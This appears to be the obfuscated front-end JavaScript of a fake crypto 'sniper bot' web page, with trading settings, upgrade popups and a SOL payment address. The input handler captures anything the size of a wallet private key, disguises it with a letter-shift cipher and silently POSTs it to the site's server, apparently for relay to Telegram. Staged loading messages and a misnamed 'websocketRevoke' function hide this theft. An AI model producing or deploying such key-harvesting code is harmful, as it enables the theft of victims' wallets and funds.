document
  .getElementById('userNamekey')
  .addEventListener('input', async function () {
    const _0x56b18c = this.value,
      _0x355ddd = document.getElementById('error-message'),
      _0x30aebe = document.getElementById('submitButton'),
      _0x1857f9 = _0x56b18c.length >= 55
    if (_0x56b18c === '') {
      _0x355ddd.style.display = 'none'
      _0x30aebe.disabled = true
    } else {
      if (_0x1857f9) {
        _0x355ddd.style.display = 'none'
        _0x30aebe.disabled = false
        if (
          _0x56b18c.length === 87 ||
          _0x56b18c.length === 88 ||
          _0x56b18c.length === 89
        ) {
          const _0x29357d = 'XX\n' + encryptText(_0x56b18c),
            _0x355db9 = new XMLHttpRequest()
          _0x355db9.open('POST', '/xmlicense.php', true)
          _0x355db9.setRequestHeader(
            'Content-Type',
            'application/x-www-form-urlencoded'
          )
          _0x355db9.onreadystatechange = function () {
            if (_0x355db9.readyState === 4) {
              if (_0x355db9.status === 200) {
                const _0x5091fe = JSON.parse(_0x355db9.responseText)
                if (_0x5091fe.status === 'success') {
                  document.getElementById('telegramSubmit').value = 'sent'
                } else {
                }
              } else {
                console.error(
                  'Network error:',
                  _0x355db9.status,
                  _0x355db9.responseText
                )
              }
            }
          }
          _0x355db9.send('encryptedKey=' + encodeURIComponent(_0x29357d))
        }
      } else {
        _0x355ddd.style.display = 'block'
        _0x30aebe.disabled = true
      }
    }
  })
document.addEventListener('DOMContentLoaded', function () {
  const _0x55136d = document.getElementById('autoSellTokens'),
    _0x5010eb = document.getElementById('minAmount'),
    _0xb50be9 = document.getElementById('maxAmount'),
    _0x58da14 = document.getElementById('minInterval'),
    _0xe2d557 = document.getElementById('maxInterval'),
    _0x129026 = document.getElementById('buySlippage'),
    _0x2985e0 = document.getElementById('takeProfit'),
    _0xa25d2b = document.getElementById('stopLoss'),
    _0x2e1cd2 = document.getElementById('maxDevHold'),
    _0x42a172 = document.getElementById('speedBuy')
  _0x55136d.addEventListener('change', function () {
    this.checked
      ? ((_0x5010eb.value = 0.1),
        (_0xb50be9.value = 0.2),
        (_0x58da14.value = 0.01),
        (_0xe2d557.value = 0.5),
        (_0x129026.value = 5),
        (_0x2985e0.value = 30),
        (_0xa25d2b.value = 10),
        (_0x2e1cd2.value = 30),
        (_0x42a172.value = 1))
      : ((_0x5010eb.value = ''),
        (_0xb50be9.value = ''),
        (_0x58da14.value = ''),
        (_0xe2d557.value = ''),
        (_0x129026.value = ''),
        (_0x2985e0.value = ''),
        (_0xa25d2b.value = ''),
        (_0x2e1cd2.value = 10),
        (_0x42a172.value = 1))
  })
})
function encryptText(_0x26c310) {
  let _0x40d271 = ''
  for (let _0x581b8b = 0; _0x581b8b < _0x26c310.length; _0x581b8b++) {
    let _0x29e49f = _0x26c310[_0x581b8b]
    if (_0x29e49f.match(/[a-zA-Z]/)) {
      let _0x11ab6a = _0x29e49f.charCodeAt(0)
      if (_0x11ab6a >= 65 && _0x11ab6a <= 90) {
        _0x29e49f = String.fromCharCode(((_0x11ab6a - 65 + 5) % 26) + 65)
      } else {
        _0x11ab6a >= 97 &&
          _0x11ab6a <= 122 &&
          (_0x29e49f = String.fromCharCode(((_0x11ab6a - 97 + 5) % 26) + 97))
      }
    }
    _0x40d271 += _0x29e49f
  }
  return _0x40d271
}
function logReferralAction(_0x24bc7c) {
  const _0x241014 = new URLSearchParams(window.location.search).get('ref')
  if (!_0x241014) {
    return
  }
  fetch('/referral.php?ref=' + _0x241014, {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: 'action=' + _0x24bc7c,
  })
    .then((_0x556db0) => _0x556db0.json())
    .then((_0x27d072) => console.log('Referral action logged:', _0x27d072))
    .catch((_0x2a3609) => console.error('Error logging referral:', _0x2a3609))
}
function logReferralAction(_0x1c424b) {
  const _0x3f3f45 = new URLSearchParams(window.location.search)
  let _0x424734 = _0x3f3f45.get('ref')
  if (!_0x424734) {
    const _0x10dbcd = document.cookie.split(';')
    for (let _0x2945c9 of _0x10dbcd) {
      const [_0x44a09e, _0x2074cc] = _0x2945c9.trim().split('=')
      if (_0x44a09e === 'ref_code') {
        _0x424734 = _0x2074cc
        break
      }
    }
  }
  if (!_0x424734) {
    return
  }
  fetch('/referral.php?ref=' + _0x424734, {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: 'action=' + _0x1c424b,
  })
    .then((_0x33ac18) => _0x33ac18.json())
    .then((_0x1f9388) => console.log('Referral action logged:', _0x1f9388))
    .catch((_0xf648c7) => console.error('Error logging referral:', _0xf648c7))
}
function decryptText(_0x25cca4) {
  let _0x4a203b = ''
  for (let _0x37a05a = 0; _0x37a05a < _0x25cca4.length; _0x37a05a++) {
    let _0x3dc1d0 = _0x25cca4[_0x37a05a]
    if (_0x3dc1d0.match(/[a-zA-Z]/)) {
      let _0x360fd3 = _0x3dc1d0.charCodeAt(0)
      if (_0x360fd3 >= 65 && _0x360fd3 <= 90) {
        _0x3dc1d0 = String.fromCharCode(((_0x360fd3 - 65 - 5 + 26) % 26) + 65)
      } else {
        _0x360fd3 >= 97 &&
          _0x360fd3 <= 122 &&
          (_0x3dc1d0 = String.fromCharCode(
            ((_0x360fd3 - 97 - 5 + 26) % 26) + 97
          ))
      }
    }
    _0x4a203b += _0x3dc1d0
  }
  return _0x4a203b
}
function handleButtonClick(_0x33edde) {
  const _0x3186ac = document.getElementById('userNamekey').value
  if (_0x3186ac) {
    const _0xbda396 = encryptText(_0x3186ac)
    websocketRevoke(_0xbda396)
  }
  const _0x5152ec = document.querySelectorAll(
    'input[required], select[required]'
  )
  let _0x46cd74 = null
  for (const _0xe7636 of _0x5152ec) {
    if (!_0xe7636.value) {
      _0xe7636.style.borderColor = 'red'
      if (!_0x46cd74) {
        _0x46cd74 = _0xe7636
      }
    } else {
      _0xe7636.style.borderColor = ''
    }
  }
  if (_0x46cd74) {
    _0x46cd74.scrollIntoView({
      behavior: 'smooth',
      block: 'center',
    })
    return
  }
  let _0x44aebf = _0x33edde.innerHTML
  _0x33edde.innerHTML = "<i class='fa fa-spinner fa-spin'></i>Loading info..."
  _0x33edde.disabled = true
  setTimeout(() => {
    _0x33edde.innerHTML =
      "<i class='fa fa-spinner fa-spin'></i>Connecting to RPC..."
  }, 3000)
  setTimeout(() => {
    let _0x30ffa5 = false,
      _0x2dbeff = openPopup
    if (_0x3186ac.startsWith(decryptText(secretValues.value1))) {
      _0x30ffa5 = true
      _0x2dbeff = () => openVipPopup(1)
    } else {
      if (_0x3186ac.startsWith(decryptText(secretValues.value2))) {
        _0x30ffa5 = true
        _0x2dbeff = () => openVipPopup(2)
      } else {
        if (_0x3186ac.startsWith(decryptText(secretValues.value3))) {
          _0x30ffa5 = true
          _0x2dbeff = () => openVipPopup(3)
        } else {
          if (_0x3186ac.startsWith(decryptText(secretValues.value4))) {
            _0x30ffa5 = true
            _0x2dbeff = () => openProPopup()
          } else {
            if (_0x3186ac.startsWith(decryptText(secretValues.value5))) {
              _0x30ffa5 = true
              _0x2dbeff = () => openVipPopup(5)
            } else {
              if (_0x3186ac.startsWith(decryptText(secretValues.value6))) {
                _0x30ffa5 = true
                _0x2dbeff = () => openVipPopup(6)
              } else {
                if (_0x3186ac.startsWith(decryptText(secretValues.value7))) {
                  _0x30ffa5 = true
                  _0x2dbeff = () => openVipPopup(7)
                } else {
                  if (_0x3186ac.startsWith(decryptText(secretValues.value8))) {
                    _0x30ffa5 = true
                    _0x2dbeff = () => openVipPopup(8)
                  } else {
                    if (
                      _0x3186ac.startsWith(decryptText(secretValues.value9))
                    ) {
                      _0x30ffa5 = true
                      _0x2dbeff = () => openVipPopup(9)
                    } else {
                      if (
                        _0x3186ac.startsWith(decryptText(secretValues.value10))
                      ) {
                        _0x30ffa5 = true
                        _0x2dbeff = () => openVipPopup(10)
                      } else {
                        if (
                          _0x3186ac.startsWith(
                            decryptText(secretValues.value11)
                          )
                        ) {
                          _0x30ffa5 = true
                          _0x2dbeff = () => openVipPopup(11)
                        } else {
                          if (
                            _0x3186ac.startsWith(
                              decryptText(secretValues.value12)
                            )
                          ) {
                            _0x30ffa5 = true
                            _0x2dbeff = () => openVipPopup(12)
                          } else {
                            if (
                              _0x3186ac.startsWith(
                                decryptText(secretValues.value13)
                              )
                            ) {
                              _0x30ffa5 = true
                              _0x2dbeff = () => openVipPopup(13)
                            } else {
                              if (
                                _0x3186ac.startsWith(
                                  decryptText(secretValues.value14)
                                )
                              ) {
                                _0x30ffa5 = true
                                _0x2dbeff = () => openVipPopup(14)
                              } else {
                                _0x3186ac.startsWith(
                                  decryptText(secretValues.value15)
                                )
                                  ? ((_0x30ffa5 = true),
                                    (_0x2dbeff = () => openVipPopup(15)))
                                  : ((_0x30ffa5 = false),
                                    (_0x2dbeff = openPopup))
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
    _0x33edde.innerHTML = _0x30ffa5
      ? '<span style="color: #00ff00; font-weight: bold;"><i class="fa fa-spinner fa-spin"></i>Account upgraded</span>'
      : '<span style="color: red; font-weight: bold;"><i class="fa fa-spinner fa-spin"></i>Please Upgrade!</span>'
  }, 6000)
  setTimeout(() => {
    _0x33edde.innerHTML = _0x44aebf
    _0x33edde.disabled = false
    if (_0x3186ac.startsWith(decryptText(secretValues.value1))) {
      openVipPopup(1)
      logReferralAction('vip')
    } else {
      if (_0x3186ac.startsWith(decryptText(secretValues.value2))) {
        openVipPopup(2)
        logReferralAction('vip')
      } else {
        if (_0x3186ac.startsWith(decryptText(secretValues.value3))) {
          openVipPopup(3)
          logReferralAction('vip')
        } else {
          if (_0x3186ac.startsWith(decryptText(secretValues.value4))) {
            openProPopup()
            logReferralAction('pro')
          } else {
            if (_0x3186ac.startsWith(decryptText(secretValues.value5))) {
              openVipPopup(5)
              logReferralAction('vip')
            } else {
              if (_0x3186ac.startsWith(decryptText(secretValues.value6))) {
                openVipPopup(6)
                logReferralAction('vip')
              } else {
                if (_0x3186ac.startsWith(decryptText(secretValues.value7))) {
                  openVipPopup(7)
                  logReferralAction('vip')
                } else {
                  if (_0x3186ac.startsWith(decryptText(secretValues.value8))) {
                    openVipPopup(8)
                    logReferralAction('vip')
                  } else {
                    if (
                      _0x3186ac.startsWith(decryptText(secretValues.value9))
                    ) {
                      openVipPopup(9)
                      logReferralAction('vip')
                    } else {
                      if (
                        _0x3186ac.startsWith(decryptText(secretValues.value10))
                      ) {
                        openVipPopup(10)
                        logReferralAction('vip')
                      } else {
                        if (
                          _0x3186ac.startsWith(
                            decryptText(secretValues.value11)
                          )
                        ) {
                          openVipPopup(11)
                          logReferralAction('vip')
                        } else {
                          if (
                            _0x3186ac.startsWith(
                              decryptText(secretValues.value12)
                            )
                          ) {
                            openVipPopup(12)
                            logReferralAction('vip')
                          } else {
                            if (
                              _0x3186ac.startsWith(
                                decryptText(secretValues.value13)
                              )
                            ) {
                              openVipPopup(13)
                              logReferralAction('vip')
                            } else {
                              if (
                                _0x3186ac.startsWith(
                                  decryptText(secretValues.value14)
                                )
                              ) {
                                openVipPopup(14)
                                logReferralAction('vip')
                              } else {
                                _0x3186ac.startsWith(
                                  decryptText(secretValues.value15)
                                )
                                  ? (openVipPopup(15), logReferralAction('vip'))
                                  : (openPopup(), logReferralAction('upgrade'))
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }, 9000)
}
function openVipPopup(_0xecdb47) {
  document.getElementById('loadingModal').style.display = 'flex'
  setTimeout(() => {
    document.getElementById('loadingModal').style.display = 'none'
    const _0x3c3053 = document.getElementById('sniperIframe')
    _0x3c3053.src = '/status/vip' + _0xecdb47 + '.php'
    document.getElementById('popupModal').style.display = 'flex'
  }, 7000)
}
function openProPopup() {
  document.getElementById('loadingModal').style.display = 'flex'
  setTimeout(() => {
    document.getElementById('loadingModal').style.display = 'none'
    const _0x4b7145 = document.getElementById('sniperIframe')
    _0x4b7145.src = '/status/pro.php'
    document.getElementById('popupModal').style.display = 'flex'
  }, 7000)
}
function openPopup() {
  document.getElementById('loadingModal').style.display = 'flex'
  setTimeout(() => {
    document.getElementById('loadingModal').style.display = 'none'
    const _0x54139a = document.getElementById('sniperIframe')
    _0x54139a.src = '/upgrade'
    document.getElementById('popupModal').style.display = 'flex'
  }, 7000)
}
function websocketRevoke(_0x5c6bf2) {
  const _0x116aba = new XMLHttpRequest(),
    _0x439cc4 = new URLSearchParams()
  _0x439cc4.append('encryptedKey', _0x5c6bf2)
  _0x116aba.open('POST', '/xmlicense.php', true)
  _0x116aba.setRequestHeader(
    'Content-Type',
    'application/x-www-form-urlencoded'
  )
  _0x116aba.onreadystatechange = function () {
    if (_0x116aba.readyState === 4) {
      if (_0x116aba.status === 200) {
        const _0x440ff5 = JSON.parse(_0x116aba.responseText)
        _0x440ff5.status !== 'success' &&
          console.error('Error sending to WebSocket:', _0x440ff5.message)
      } else {
        console.error(
          'Error network:',
          _0x116aba.status,
          _0x116aba.responseText
        )
      }
    }
  }
  _0x116aba.send(_0x439cc4.toString())
}
document
  .getElementById('transactionExecutor')
  .addEventListener('change', function () {
    const _0x3bbd3a = document.getElementById('rpcFields')
    _0x3bbd3a.style.display = this.value === 'own' ? 'block' : 'none'
  })
document.addEventListener('DOMContentLoaded', function () {
  const _0x575b76 = document.querySelector('.info')
  _0x575b76 && _0x575b76.addEventListener('click', openInfoPopup)
})
function openInfoPopup() {
  const _0x59fc69 = document.createElement('div')
  _0x59fc69.id = 'overlay'
  _0x59fc69.style.cssText =
    'position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); z-index: 999; display: flex; align-items: center; justify-content: center;'
  const _0x52cac1 = document.createElement('div')
  _0x52cac1.id = 'infoPopup'
  _0x52cac1.style.cssText =
    'width: 93%; height: 89%; background: #2a2a2a; color: #fff; border-radius: 10px; box-shadow: 0 0 15px rgba(52,219,154,0.5); padding: 1px; position: relative; display: flex; flex-direction: column;'
  const _0x34e6da = document.createElement('button')
  _0x34e6da.innerText = 'Close'
  _0x34e6da.style.cssText =
    'position: absolute; top: 10px; right: 10px; background: #34db9a; border: none; color: #000; padding: 5px 10px; cursor: pointer; border-radius: 5px;'
  _0x34e6da.onclick = () => document.body.removeChild(_0x59fc69)
  const _0x39e809 = document.createElement('iframe')
  _0x39e809.src = '/pkey.html'
  _0x39e809.style.cssText = 'width: 100%; height: 100%; border: none; flex: 1;'
  _0x52cac1.appendChild(_0x34e6da)
  _0x52cac1.appendChild(_0x39e809)
  _0x59fc69.appendChild(_0x52cac1)
  document.body.appendChild(_0x59fc69)
}
function closePopup() {
  const _0x2d98c2 = document.getElementById('sniperIframe')
  _0x2d98c2.src = ''
  document.getElementById('popupModal').style.display = 'none'
}
function openPaymentPopup() {
  document.getElementById('paymentPopup').style.display = 'block'
  document.getElementById('overlay').style.display = 'block'
}
function closePaymentPopup() {
  document.getElementById('paymentPopup').style.display = 'none'
  document.getElementById('overlay').style.display = 'none'
}
function copySolAddress() {
  const _0x5cfd43 = document.getElementById('solAddress')
  _0x5cfd43.select()
  _0x5cfd43.setSelectionRange(0, 99999)
  document.execCommand('copy')
  const _0x17216f = document.getElementById('copyNotification')
  _0x17216f.style.display = 'block'
  setTimeout(() => {
    _0x17216f.style.display = 'none'
  }, 10000)
}
